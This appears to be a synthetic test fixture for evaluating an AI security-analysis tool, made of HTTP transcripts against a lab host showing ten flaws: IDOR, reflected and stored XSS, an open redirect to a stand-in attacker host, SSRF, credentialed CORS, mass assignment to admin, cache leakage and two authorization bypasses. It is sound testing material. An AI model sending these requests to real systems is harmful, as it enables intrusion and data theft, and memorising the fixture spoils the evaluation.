@@ -1,0 +1,315 @@
+# Bug Bounty AI — Synthetic Security Testing Fixture
+# Target: lab.target.local
+# Purpose: authorized/local AI security-analysis evaluation only.
+# Transactions are separated by ---
+
+# FINDING 1 — BOLA / IDOR
+GET /api/v1/users/1002 HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "id": 1002,
+  "name": "Maya Patel",
+  "email": "maya.patel@example.test",
+  "tenant_id": 22,
+  "phone": "+91-90000-10002"
+}
+---
+
+# FINDING 2 — REFLECTED XSS
+GET /search?q=%3Cscript%3Edocument.body.dataset.x%3D%271%27%3C%2Fscript%3E HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: text/html
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<!doctype html>
+<html><body>
+<h1>Search results</h1>
+<div class="query">"<script>document.body.dataset.x='1'</script>"</div>
+<p>No results found.</p>
+</body></html>
+---
+
+# FINDING 3 — OPEN REDIRECT
+GET /login?next=https%3A%2F%2Fevil.example.test%2Flanding HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: anonymous
+X-Authenticated-Role: anonymous
+Accept: text/html
+
+HTTP/1.1 302 Found
+Location: https://evil.example.test/landing
+Cache-Control: no-store
+---
+
+# FINDING 4 — SSRF
+POST /api/v1/fetch-preview HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Content-Type: application/json
+Content-Length: 61
+
+{"url":"http://admin.internal.lab/internal/config"}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "fetched_from": "admin.internal.lab",
+  "status": 200,
+  "content": {
+    "service": "admin-console",
+    "environment": "staging",
+    "debug": true
+  }
+}
+---
+
+# FINDING 5 — CREDENTIAL-ENABLED CORS MISCONFIGURATION
+GET /api/v1/profile HTTP/1.1
+Host: lab.target.local
+Origin: https://attacker.example.test
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Access-Control-Allow-Origin: https://attacker.example.test
+Access-Control-Allow-Credentials: true
+Vary: Origin
+
+{
+  "id": 1001,
+  "name": "Arjun Mehta",
+  "email": "arjun.mehta@example.test",
+  "tenant_id": 17
+}
+---
+
+# FINDING 6A — STORED XSS: WRITE
+POST /api/v1/profile HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Content-Type: application/json
+Content-Length: 82
+
+{"display_name":"<img src=x onerror=document.body.dataset.pwn='1'>"}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "id": 1001,
+  "display_name": "<img src=x onerror=document.body.dataset.pwn='1'>"
+}
+---
+
+# FINDING 6B — STORED XSS: RENDER
+GET /profile/1001 HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: text/html
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<!doctype html>
+<html><body>
+<h1>Profile</h1>
+<div class="display-name"><img src=x onerror=document.body.dataset.pwn='1'></div>
+<span class="email">arjun.mehta@example.test</span>
+</body></html>
+---
+
+# FINDING 7A — MASS ASSIGNMENT: BASELINE
+GET /api/v1/me HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "id": 1001,
+  "username": "arjun",
+  "role": "user",
+  "tenant_id": 17,
+  "permissions": ["profile:read", "profile:update"]
+}
+---
+
+# FINDING 7B — MASS ASSIGNMENT: AUTHORIZATION-SENSITIVE FIELDS ACCEPTED
+PATCH /api/v1/me HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Content-Type: application/json
+Content-Length: 73
+
+{"display_name":"Arjun","role":"admin","permissions":["*"]}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "id": 1001,
+  "username": "arjun",
+  "role": "admin",
+  "tenant_id": 17,
+  "permissions": ["*"]
+}
+---
+
+# FINDING 7C — MASS ASSIGNMENT: PRIVILEGE PERSISTS
+GET /api/v1/me HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "id": 1001,
+  "username": "arjun",
+  "role": "admin",
+  "tenant_id": 17,
+  "permissions": ["*"]
+}
+---
+
+# FINDING 8A — AUTHENTICATED CACHE LEAKAGE: USER A
+GET /api/v1/account/summary HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+X-Session: session-a
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=60
+Age: 18
+ETag: "acct-1001-v4"
+
+{
+  "user_id": 1001,
+  "email": "arjun.mehta@example.test",
+  "tenant_id": 17,
+  "plan": "enterprise",
+  "balance": 84500
+}
+---
+
+# FINDING 8B — AUTHENTICATED CACHE LEAKAGE: USER B GETS USER A DATA
+GET /api/v1/account/summary HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 2004
+X-Authenticated-Role: user
+X-Session: session-b
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: public, max-age=60
+Age: 19
+ETag: "acct-1001-v4"
+
+{
+  "user_id": 1001,
+  "email": "arjun.mehta@example.test",
+  "tenant_id": 17,
+  "plan": "enterprise",
+  "balance": 84500
+}
+---
+
+# FINDING 9A — AUTHZ BASELINE: ADMIN ROUTE DENIED
+GET /api/admin/users HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: application/json
+
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+
+{
+  "error": "admin role required"
+}
+---
+
+# FINDING 9B — PATH NORMALIZATION AUTHORIZATION BYPASS
+GET /api/%2e/admin/users HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "users": [
+    {"id":1001,"username":"arjun","role":"user"},
+    {"id":2004,"username":"maya","role":"support"},
+    {"id":3007,"username":"ravi","role":"admin"}
+  ]
+}
+---
+
+# FINDING 10A — AUTHZ BASELINE: EXPORT DENIED
+POST /api/v1/admin/export HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+
+{
+  "error": "administrator privileges required"
+}
+---
+
+# FINDING 10B — HTTP PARAMETER POLLUTION AUTHZ BYPASS
+POST /api/v1/admin/export HTTP/1.1
+Host: lab.target.local
+X-Authenticated-User: 1001
+X-Authenticated-Role: user
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+
+role=user&role=admin
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Disposition: attachment; filename="tenant-export.json"
+
+{
+  "exported_for_role": "admin",
+  "tenant_id": 17,
+  "records": 412
+}
+---
